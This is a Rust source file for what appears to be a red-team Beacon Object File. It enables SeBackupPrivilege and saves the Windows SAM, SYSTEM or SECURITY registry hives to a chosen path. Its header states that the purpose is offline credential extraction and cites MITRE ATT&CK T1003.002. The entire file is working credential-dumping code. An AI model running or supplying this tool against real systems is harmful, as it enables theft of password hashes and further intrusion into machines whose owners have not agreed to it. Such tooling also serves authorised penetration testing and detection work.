//! # Registry Save BOF
//!
//! Saves a registry hive to a file using RegSaveKeyA. Automatically enables
//! SeBackupPrivilege which is required for this operation. Useful for dumping
//! SAM, SECURITY, or SYSTEM hives for offline credential extraction.
//!
//! ## MITRE ATT&CK
//! - T1003.002 - OS Credential Dumping: Security Account Manager
//!
//! ## Arguments
//! - `str`: Hive name ("HKLM", "HKCU", "HKCR", "HKU", "SAM", "SYSTEM", "SECURITY").
//! - `str`: Output file path.

#![no_std]

use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, LUID, FALSE};
use windows_sys::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
};
use windows_sys::Win32::System::Registry::*;
use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

const HKEY_CLASSES_ROOT: isize = 0x80000000u32 as isize;
const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const HKEY_LOCAL_MACHINE: isize = 0x80000002u32 as isize;
const HKEY_USERS: isize = 0x80000003u32 as isize;

fn hive_from_name(name: &str) -> Option<(isize, &'static str)> {
    match name {
        "HKLM" => Some((HKEY_LOCAL_MACHINE, "")),
        "HKCU" => Some((HKEY_CURRENT_USER, "")),
        "HKCR" => Some((HKEY_CLASSES_ROOT, "")),
        "HKU" => Some((HKEY_USERS, "")),
        "SAM" => Some((HKEY_LOCAL_MACHINE, "SAM")),
        "SYSTEM" => Some((HKEY_LOCAL_MACHINE, "SYSTEM")),
        "SECURITY" => Some((HKEY_LOCAL_MACHINE, "SECURITY")),
        _ => None,
    }
}

fn enable_backup_privilege() -> u32 {
    unsafe {
        let mut token: *mut core::ffi::c_void = core::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) == FALSE {
            return GetLastError();
        }

        let mut luid: LUID = core::mem::zeroed();
        let priv_name = rustbof::str::to_cstr("SeBackupPrivilege");
        if LookupPrivilegeValueA(core::ptr::null(), priv_name.as_ptr() as *const u8, &mut luid) == FALSE {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let mut tp: TOKEN_PRIVILEGES = core::mem::zeroed();
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if AdjustTokenPrivileges(
            token,
            FALSE,
            &tp,
            core::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        ) == FALSE
        {
            let err = GetLastError();
            CloseHandle(token);
            return err;
        }

        let err = GetLastError();
        CloseHandle(token);
        err
    }
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let hive_str = alloc::string::String::from(parser.get_str());
    let output_path = alloc::string::String::from(parser.get_str());

    if hive_str.is_empty() {
        eprintln!("Hive name is required (HKLM, HKCU, HKCR, HKU, SAM, SYSTEM, SECURITY)");
        return;
    }

    if output_path.is_empty() {
        eprintln!("Output file path is required");
        return;
    }

    let (hive_key, subkey) = match hive_from_name(&hive_str) {
        Some(h) => h,
        None => {
            eprintln!("Invalid hive: {} (use HKLM, HKCU, HKCR, HKU, SAM, SYSTEM, SECURITY)", hive_str);
            return;
        }
    };

    let status = enable_backup_privilege();
    if status != 0 {
        eprintln!("WARNING: Failed to enable SeBackupPrivilege: 0x{:X}", status);
    } else {
        println!("Enabled SeBackupPrivilege");
    }

    let output_cstr = rustbof::str::to_cstr(&output_path);

    unsafe {
        let save_key: isize = if subkey.is_empty() {
            hive_key
        } else {
            let subkey_cstr = rustbof::str::to_cstr(subkey);
            let mut hkey: isize = 0;
            let ret = RegOpenKeyExA(
                hive_key as HKEY,
                subkey_cstr.as_ptr() as *const u8,
                0,
                KEY_READ,
                &mut hkey as *mut isize as *mut HKEY,
            );
            if ret != 0 {
                eprintln!("RegOpenKeyExA failed on HKLM\\{}: 0x{:X}", subkey, ret);
                return;
            }
            hkey
        };

        let ret = RegSaveKeyA(
            save_key as HKEY,
            output_cstr.as_ptr() as *const u8,
            core::ptr::null(),
        );
        if ret != 0 {
            eprintln!("RegSaveKeyA failed for {} to '{}': 0x{:X}", hive_str, output_path, ret);
        } else {
            println!("SUCCESS: Saved {} hive to '{}'", hive_str, output_path);
        }

        if !subkey.is_empty() {
            RegCloseKey(save_key as HKEY);
        }
    }
}
